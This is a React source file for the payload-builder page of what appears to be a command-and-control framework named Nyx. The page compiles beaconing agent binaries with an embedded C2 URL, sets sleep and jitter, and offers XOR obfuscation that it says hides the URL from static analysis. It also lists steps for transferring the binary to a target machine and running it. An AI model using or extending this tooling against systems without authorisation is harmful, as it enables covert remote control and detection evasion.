import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Download, Package, CheckCircle, AlertCircle, Loader } from "lucide-react";

const PLATFORMS = [
  { id: "linux-amd64",   label: "Linux",   sub: "x86_64",  icon: "🐧" },
  { id: "linux-arm64",   label: "Linux",   sub: "ARM64",   icon: "🐧" },
  { id: "darwin-amd64",  label: "macOS",   sub: "Intel",   icon: "🍎" },
  { id: "darwin-arm64",  label: "macOS",   sub: "Apple Silicon", icon: "🍎" },
  { id: "windows-amd64", label: "Windows", sub: "x86_64",  icon: "🪟" },
];

type BuildState = "idle" | "building" | "done" | "error";

export default function Builder() {
  const [c2url, setC2url]       = useState("http://127.0.0.1:8000");
  const [platform, setPlatform] = useState("linux-amd64");
  const [sleep, setSleep]       = useState(5);
  const [jitter, setJitter]     = useState(1);
  const [state, setState]       = useState<BuildState>("idle");
  const [error, setError]       = useState("");
  const [filename, setFilename] = useState("");
  const [obfuscate, setObfuscate] = useState(false);

  const build = async () => {
    setState("building"); setError("");
    try {
      const token = localStorage.getItem("nyx_token");
      const res = await fetch("http://localhost:8000/api/builder/build", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
        body: JSON.stringify({ c2_url: c2url, platform, sleep, jitter, obfuscate }),
      });

      if (!res.ok) {
        const err = await res.json();
        throw new Error(err.detail ?? "Build failed");
      }

      const blob = await res.blob();
      const ext  = platform.startsWith("windows") ? ".exe" : "";
      const name = `nyx-agent-${platform}${ext}`;
      setFilename(name);

      const url = URL.createObjectURL(blob);
      const a   = document.createElement("a");
      a.href = url; a.download = name; a.click();
      URL.revokeObjectURL(url);

      setState("done");
      setTimeout(() => setState("idle"), 4000);
    } catch (e: any) {
      setError(e.message);
      setState("error");
    }
  };

  return (
    <div className="p-7 space-y-6 bg-nyx-bg min-h-full">
      <motion.div initial={{ opacity: 0, y: -8 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.3 }}>
        <h1 className="text-nyx-text text-2xl font-bold tracking-tight" style={{ fontFamily: "Bricolage Grotesque, sans-serif", letterSpacing: "-0.02em" }}>Payload Builder</h1>
        <p className="text-nyx-muted text-sm mt-1">Compile a custom agent with your C2 URL embedded</p>
      </motion.div>

      <div className="grid grid-cols-3 gap-6">
        {/* config */}
        <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}
          className="col-span-2 bg-white rounded-2xl p-6 space-y-5" style={{ border: "1px solid #E5DDD0", boxShadow: "0 1px 4px rgba(0,0,0,0.04)" }}>

          <div>
            <label className="block text-nyx-dim text-xs font-semibold mb-2 uppercase" style={{ letterSpacing: "0.08em" }}>C2 Server URL</label>
            <input value={c2url} onChange={e => setC2url(e.target.value)}
              className="input-base w-full rounded-xl px-4 py-3 text-sm mono"
              placeholder="https://your-server.com" />
            <p className="text-nyx-muted text-xs mt-1.5">The agent will beacon back to this URL</p>
          </div>

          <div>
            <label className="block text-nyx-dim text-xs font-semibold mb-3 uppercase" style={{ letterSpacing: "0.08em" }}>Target Platform</label>
            <div className="grid grid-cols-3 gap-2 sm:grid-cols-5">
              {PLATFORMS.map(p => (
                <motion.button key={p.id} onClick={() => setPlatform(p.id)}
                  whileHover={{ y: -2 }} whileTap={{ scale: 0.97 }}
                  className="flex flex-col items-center gap-1.5 py-3 px-2 rounded-xl text-xs font-medium transition-all"
                  style={platform === p.id
                    ? { background: "#EEF1FB", border: "1px solid rgba(30,60,184,0.25)", color: "#1E3CB8" }
                    : { background: "#F8F6F1", border: "1px solid #E5DDD0", color: "#8C95A8", cursor: "pointer" }
                  }>
                  <span className="text-lg">{p.icon}</span>
                  <span>{p.label}</span>
                  <span className="text-nyx-muted" style={{ fontSize: "10px" }}>{p.sub}</span>
                </motion.button>
              ))}
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-nyx-dim text-xs font-semibold mb-2 uppercase" style={{ letterSpacing: "0.08em" }}>Sleep (seconds)</label>
              <input type="number" value={sleep} onChange={e => setSleep(+e.target.value)}
                className="input-base w-full rounded-xl px-4 py-3 text-sm mono" min={1} max={3600} />
              <p className="text-nyx-muted text-xs mt-1.5">Beacon interval</p>
            </div>
            <div>
              <label className="block text-nyx-dim text-xs font-semibold mb-2 uppercase" style={{ letterSpacing: "0.08em" }}>Jitter (seconds)</label>
              <input type="number" value={jitter} onChange={e => setJitter(+e.target.value)}
                className="input-base w-full rounded-xl px-4 py-3 text-sm mono" min={0} max={60} />
              <p className="text-nyx-muted text-xs mt-1.5">Random sleep variance</p>
            </div>
          </div>

          {/* Obfuscation toggle */}
          <div className="flex items-center gap-3 p-3 rounded-xl" style={{ background: "#F8F6F1", border: "1px solid #E5DDD0" }}>
            <motion.button onClick={() => setObfuscate(v => !v)}
              className="relative w-9 h-5 rounded-full flex-shrink-0 transition-colors"
              style={{ background: obfuscate ? "#1E3CB8" : "#C5C9D4" }}
              whileTap={{ scale: 0.95 }}>
              <motion.div animate={{ x: obfuscate ? 16 : 2 }} transition={{ type: "spring", stiffness: 500, damping: 30 }}
                className="absolute top-0.5 w-4 h-4 rounded-full bg-white" style={{ boxShadow: "0 1px 3px rgba(0,0,0,0.2)" }} />
            </motion.button>
            <div>
              <p className="text-nyx-text text-xs font-semibold">XOR String Obfuscation</p>
              <p className="text-nyx-muted text-xs mt-0.5">Hides C2 URL from static analysis — generates a random XOR key per build</p>
            </div>
          </div>

          <motion.button onClick={build} disabled={state === "building"}
            whileHover={{ scale: 1.01, boxShadow: "0 6px 24px rgba(30,60,184,0.28)" }}
            whileTap={{ scale: 0.98 }}
            className="btn-primary w-full py-3.5 rounded-xl text-sm flex items-center justify-center gap-2">
            {state === "building"
              ? <><motion.span animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity, ease: "linear" }}><Loader size={15} /></motion.span> Building…</>
              : <><Package size={15} /> Build Agent</>
            }
          </motion.button>
        </motion.div>

        {/* info panel */}
        <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.18 }}
          className="space-y-4">
          {/* status */}
          <AnimatePresence>
            {state === "done" && (
              <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.95 }}
                className="bg-white rounded-2xl p-4 flex items-start gap-3" style={{ border: "1px solid rgba(10,107,74,0.2)" }}>
                <CheckCircle size={16} className="text-nyx-green mt-0.5 flex-shrink-0" />
                <div>
                  <div className="text-nyx-text text-sm font-semibold">Build successful</div>
                  <div className="mono text-nyx-muted text-xs mt-0.5">{filename}</div>
                </div>
              </motion.div>
            )}
            {state === "error" && (
              <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0 }}
                className="bg-white rounded-2xl p-4 flex items-start gap-3" style={{ border: "1px solid rgba(184,40,40,0.2)" }}>
                <AlertCircle size={16} className="text-nyx-red mt-0.5 flex-shrink-0" />
                <div>
                  <div className="text-nyx-red text-sm font-semibold">Build failed</div>
                  <div className="text-nyx-muted text-xs mt-0.5">{error}</div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* how to use */}
          <div className="bg-white rounded-2xl p-5 space-y-3" style={{ border: "1px solid #E5DDD0", boxShadow: "0 1px 4px rgba(0,0,0,0.04)" }}>
            <div className="text-nyx-text text-sm font-semibold flex items-center gap-2">
              <Download size={14} className="text-nyx-accent" /> Deploy
            </div>
            <div className="space-y-2">
              {[
                ["1. Build", "Configure and click Build Agent"],
                ["2. Transfer", "Copy binary to target machine"],
                ["3. Execute", "Run the binary with appropriate permissions"],
                ["4. Monitor", "Agent appears in the Agents tab"],
              ].map(([step, desc]) => (
                <div key={step} className="flex gap-3">
                  <span className="text-xs font-semibold text-nyx-accent mono w-14 flex-shrink-0 pt-0.5">{step}</span>
                  <span className="text-nyx-muted text-xs">{desc}</span>
                </div>
              ))}
            </div>
          </div>

          {/* build info */}
          <div className="bg-white rounded-2xl p-5 space-y-2" style={{ border: "1px solid #E5DDD0", boxShadow: "0 1px 4px rgba(0,0,0,0.04)" }}>
            <div className="text-nyx-text text-sm font-semibold mb-3">Build Info</div>
            {[
              ["Platform", PLATFORMS.find(p => p.id === platform)?.label + " " + PLATFORMS.find(p => p.id === platform)?.sub],
              ["C2 URL",   c2url],
              ["Sleep",    `${sleep}s ± ${jitter}s`],
              ["Stripped", "Yes (-s -w)"],
            ].map(([k, v]) => (
              <div key={k} className="flex justify-between items-center py-1.5 border-b border-nyx-border last:border-0">
                <span className="text-nyx-muted text-xs font-medium">{k}</span>
                <span className="mono text-nyx-dim text-xs truncate max-w-32">{v}</span>
              </div>
            ))}
          </div>
        </motion.div>
      </div>
    </div>
  );
}
